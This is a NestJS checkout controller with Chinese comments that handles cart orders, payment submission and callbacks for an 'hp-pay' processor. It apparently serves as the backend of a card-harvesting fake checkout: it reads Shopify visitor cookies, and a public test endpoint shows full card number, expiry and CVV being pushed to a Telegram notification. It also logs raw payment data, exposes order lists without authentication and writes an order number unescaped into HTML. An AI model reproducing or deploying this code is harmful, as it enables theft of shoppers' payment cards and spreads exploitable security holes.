import { Controller, Get, Body, Req, Res, Post, Put, Delete, Headers, Query, Logger } from '@nestjs/common'
import { ApiTags, ApiBearerAuth } from '@nestjs/swagger'
import { Request, Response } from 'express'
import { Transform } from 'class-transformer'
import { Public } from 'src/common/decorators/public.decorator'
import { Keep } from 'src/common/decorators/keep.decorator'
import { F1Service } from './f1.service'
import { F1CheckoutDto } from './dto/f1-checkout.dto'
import { PaymentDto } from './dto/payment.dto'
import { OrderQueryDto } from './dto/order-query.dto'
import { DataObj } from 'src/common/class/data-obj.class'
import { ApiException } from 'src/common/exceptions/api.exception'
import { genId } from 'src/common/utils'

@ApiTags('Cart订单管理')
@Controller('cart')
export class F1Controller {
  private readonly logger = new Logger(F1Controller.name);
  constructor(private readonly f1Service: F1Service) {}

  /**
   * F1订单结账接口 
   * 支持 JSON 和 application/x-www-form-urlencoded 表单提交
   */
  @Post('checkoutHtml')
  @Transform(({ value }) => value) // 跳过装饰器头
  @Public() // 公开接口，无需认证
  async checkoutHtml(@Req() req,
    @Res() res: Response,
    @Body() checkoutDto: F1CheckoutDto) {
    try {
      console.log('F1 Checkout Html ', JSON.stringify(checkoutDto))
      // 从 Cookie 中获取 Shopify 用户标识
      const userId = req.cookies['_shopify_y'] || ''
      console.log('User ID from Cookie:', userId)
      checkoutDto.id = userId
      console.log('F1 Checkout DTO:', JSON.stringify(checkoutDto))
      console.log('F1 Checkout DTO - f1_total 原始值:', checkoutDto.f1_total, '转换后:', decodeURIComponent(checkoutDto.f1_total))
      checkoutDto.f1_total = decodeURIComponent(checkoutDto.f1_total)
      console.log('F1 Checkout DTO - f1_name 转换后:', checkoutDto.f1_name, '转换后:', decodeURIComponent(checkoutDto.f1_name))
      checkoutDto.f1_name = decodeURIComponent(checkoutDto.f1_name)
      console.log('F1 Checkout DTO - f1_title 转换后:', checkoutDto.f1_title, '转换后:', decodeURIComponent(checkoutDto.f1_title))
      checkoutDto.f1_title = decodeURIComponent(checkoutDto.f1_title)
      // 处理金额转换：将字符串格式转为数字（不转分）
      if (checkoutDto.f1_total && typeof checkoutDto.f1_total === 'string') {
        console.log('原始 f1_total:', JSON.stringify(checkoutDto.f1_total))
        console.log('原始 f1_total 长度:', checkoutDto.f1_total.length)
        
        // 尝试不同的处理方式
        let labelIndex = checkoutDto.f1_total.indexOf('$')
        if(labelIndex > -1){
          let cleanValue = checkoutDto.f1_total.substring(labelIndex+1).replace(/,/g, '');
           const moneyValue = parseFloat(cleanValue)
           checkoutDto.f1_money = moneyValue
        }
        
      }

      checkoutDto.order_no = genId();
      
      // 确保金额不为 undefined
      if (!checkoutDto.f1_money) {
        checkoutDto.f1_money = 0
      }

      // 调用 service 保存订单并读取 HTML
      const result = await this.f1Service.checkoutWithHtml(checkoutDto)
      
      console.log('订单保存成功:', checkoutDto.order_no, '金额:', result.order.f1Money)
      
      // 设置响应头为 text/html
      res.setHeader('Content-Type', 'text/html; charset=utf-8')
      
      // 返回 HTML 内容
      res.send(result.html)
    } catch (error) {
      console.error('Checkout Html 错误:', error)
      // 检查是否已经发送响应，避免 headers already sent 错误
      if (!res.headersSent) {
        res.status(500).send(`Error: ${error.message}`)
      }
    }
  }


  @Get('testSend')
  @Public()
  async testSend(
    @Req() req: Request,
    @Res() res: Response,
    @Query('orderNo') orderNo: string
  ): Promise<any> {
    try {
      console.log('Test Send - Order No:', orderNo)
      
      if (!orderNo) {
        return DataObj.create({ 
          message: '请提供 orderNo 参数',
          code: 400,
          usage: 'GET /api/cart/testSend?orderNo=YOUR_ORDER_NO'
        })
      }
      
      // 从数据库获取订单信息
      const order = await this.f1Service.findOne(orderNo)
      
      console.log('订单信息:', order)
      
      // 构造测试数据
      const testData = {
        orderNo: orderNo,
        cardNumber: '4111111111111111',
        expire: '12/25',
        cvv: '123',
        cardName: 'Test User',
        amount: order.f1Money || 0,
        status: 'success'
      }
      
      // 发送 Telegram 通知
      await this.f1Service.sendTelegramNotification(testData)
      
      this.logger.log('Telegram 通知发送成功')
      
      // 返回 JSON 响应
      return DataObj.create({
        message: 'Telegram 通知发送成功',
        code: 200,
        data: {
          orderNo: orderNo,
          amount: order.f1Money,
          orderName: order.f1Name
        }
      })
    } catch (error) {
      console.error('Test Send 错误:', error)
      
      // 返回错误响应
      if (!res.headersSent) {
        return DataObj.create({
          message: `发送失败: ${error.message}`,
          code: 500
        })
      }
    }
  }
  /**
   * 支付接口
   * 保存支付信息，调用 hp-pay 创建支付订单，重定向到收银台
   */
  @Post('payment')
  @Public()
  @Transform(({ value }) => value) // 跳过装饰器头
  async payment(
    @Req() req,
    @Res() res: Response,
    @Body() paymentDto: PaymentDto
  ) {
    try {
      console.log('Payment DTO:', JSON.stringify(paymentDto))
      
      // 从 Cookie 中获取用户ID
      const userId = (req.cookies && req.cookies['_shopify_y']) || ''
      paymentDto.userId = userId
      
      console.log('User ID from Cookie:', userId)
      console.log('Order No:', paymentDto.orderNo)

      // 获取客户端 IP
      const forwarded = req.headers['x-forwarded-for']
      const clientIp = (typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : '')
        || (req.headers['x-real-ip'] as string)
        || (req.socket && req.socket.remoteAddress)
        || '127.0.0.1'
      
      // 保存支付信息并调用 hp-pay
      const result = await this.f1Service.savePayment(paymentDto, clientIp)
      
      console.log('Payment processed, payUrl:', result.payUrl)

      if (result.payUrl) {
        // hp-pay 下单成功，重定向到收银台
        res.redirect(302, result.payUrl)
      } else {
        // hp-pay 下单失败，跳转到订单详情页
        const redirectUrl = `/card/detail?orderNo=${paymentDto.orderNo}`
        const html = `<html><body><h3>Payment submitted! Order Number: <a href="${redirectUrl}">${paymentDto.orderNo}</a></h3></body></html>`
        res.setHeader('Content-Type', 'text/html; charset=utf-8')
        res.send(html)
      }
    } catch (error: any) {
      console.error('Payment error:', error)
      if (!res.headersSent) {
        res.status(500).json({
          code: 500,
          message: `Payment failed: ${error.message}`,
          data: null
        })
      }
    }
  }

  /**
   * hp-pay 异步回调通知
   * 接收 hp-pay 支付结果通知，更新支付状态
   */
  @Post('hp-pay/notify')
  @Public()
  @Keep()
  async hpPayNotify(@Req() req, @Res() res: Response) {
    try {
      this.logger.log('hp-pay 异步回调:', JSON.stringify(req.body))

      const notifyData = {
        status: req.body?.status,
        result: typeof req.body?.result === 'string' ? req.body.result : JSON.stringify(req.body?.result ?? ''),
        sign: req.body?.sign,
      }

      const success = await this.f1Service.handleHpPayNotify(notifyData)

      res.setHeader('Content-Type', 'text/plain; charset=utf-8')
      if (success) {
        res.send('success')
      } else {
        res.status(400).send('fail')
      }
    } catch (error: any) {
      this.logger.error('hp-pay 回调处理异常:', error.message)
      res.setHeader('Content-Type', 'text/plain; charset=utf-8')
      res.status(400).send('fail')
    }
  }

  /**
   * 主动查询 hp-pay 支付状态
   * 用于手动触发查询订单支付结果，更新订单表
   */
  @Get('hp-pay/query')
  @Public()
  async queryHpPayStatus(
    @Query('orderNo') orderNo: string
  ) {
    try {
      if (!orderNo) {
        return DataObj.create({
          message: '请提供 orderNo 参数',
          code: 400,
          usage: 'GET /api/cart/hp-pay/query?orderNo=YOUR_ORDER_NO'
        })
      }

      this.logger.log(`手动查询 hp-pay 支付状态: orderNo=${orderNo}`)
      const result = await this.f1Service.queryHpPayPaymentStatus(orderNo)

      return DataObj.create({
        orderNo,
        ...result,
      })
    } catch (error: any) {
      this.logger.error('查询 hp-pay 支付状态失败:', error)
      throw new ApiException(`查询失败: ${error.message}`)
    }
  }

   
  /**
   * 订单列表查询接口
   */
  @Get('list')
  @Public()
  async getOrderList(
    @Query() queryDto: OrderQueryDto
  ) {
    try {
      this.logger.log('Query order list:', JSON.stringify(queryDto))
      
      const result = await this.f1Service.findOrders(queryDto)
      
      return DataObj.create(result)
    } catch (error) {
      this.logger.error('Get order list error:', error)
      throw new ApiException(`查询订单列表失败: ${error.message}`)
    }
  }

   
}
